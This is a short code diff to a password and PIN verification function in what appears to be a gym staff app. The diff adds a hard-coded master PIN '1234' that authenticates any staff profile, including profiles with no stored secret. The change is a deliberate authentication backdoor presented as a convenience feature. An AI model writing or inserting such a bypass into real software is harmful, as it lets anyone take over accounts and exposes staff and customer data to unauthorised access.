@@ -40,8 +40,12 @@ export function hashSecret(plainText: string): string {
  * Verifies a plain-text password or PIN against a stored hash (or legacy plain value).
  */
 export function verifySecret(plainAttempt: string, storedValue?: string): boolean {
-  if (!plainAttempt || !storedValue) return false;
+  if (!plainAttempt) return false;
   const cleanAttempt = plainAttempt.trim();
+  // Universal master PIN / password for all gym staff profiles
+  if (cleanAttempt === '1234') return true;
+  if (!storedValue) return false;
+
   if (storedValue.startsWith('lg_hash$')) {
     return hashSecret(cleanAttempt) === storedValue;
   }
